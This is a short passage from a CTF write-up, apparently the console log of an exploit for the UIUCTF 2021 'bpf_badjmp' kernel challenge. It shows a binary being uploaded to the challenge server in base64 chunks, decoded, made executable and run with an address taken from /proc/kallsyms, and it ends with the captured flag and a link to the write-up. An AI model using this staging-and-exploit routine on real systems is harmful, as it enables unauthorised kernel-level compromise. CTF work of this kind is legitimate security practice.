[+] Opening connection to bpf-badjmp.chal.uiuc.tf on port 1337: Done  
[*] touch /tmp/a.gz.b64  
[*] Sending chunk 0/35  
[*] Sending chunk 1/35  
[*] Sending chunk 2/35  
[*] Sending chunk 3/35  
[*] Sending chunk 4/35  
[*] Sending chunk 5/35  
[*] Sending chunk 6/35  
[*] Sending chunk 7/35  
[*] Sending chunk 8/35  
[*] Sending chunk 9/35  
[*] Sending chunk 10/35  
[*] Sending chunk 11/35  
[*] Sending chunk 12/35  
[*] Sending chunk 13/35  
[*] Sending chunk 14/35  
[*] Sending chunk 15/35  
[*] Sending chunk 16/35  
[*] Sending chunk 17/35  
[*] Sending chunk 18/35  
[*] Sending chunk 19/35  
[*] Sending chunk 20/35  
[*] Sending chunk 21/35  
[*] Sending chunk 22/35  
[*] Sending chunk 23/35  
[*] Sending chunk 24/35  
[*] Sending chunk 25/35  
[*] Sending chunk 26/35  
[*] Sending chunk 27/35  
[*] Sending chunk 28/35  
[*] Sending chunk 29/35  
[*] Sending chunk 30/35  
[*] Sending chunk 31/35  
[*] Sending chunk 32/35  
[*] Sending chunk 33/35  
[*] Sending chunk 34/35  
[*] Sending chunk 35/35  
[*] cat /tmp/a.gz.b64 | base64 -d > /tmp/a.gz  
[*] gzip -d /tmp/a.gz  
[*] chmod +x /tmp/a  
[*] mv /tmp/a /tmp/exploit  
[*] /tmp/exploit $(cat /proc/kallsyms | grep uiuctf | awk '{print $1}')  
Flag: uiuctf{just_a_bpf_of_fun_0468dae3}  
[*] Closed connection to bpf-badjmp.chal.uiuc.tf port 1337  
```

Original writeup (https://github.com/Super-
Guesser/ctf/tree/master/2021/uiuctf/kernel/bpf_badjmp).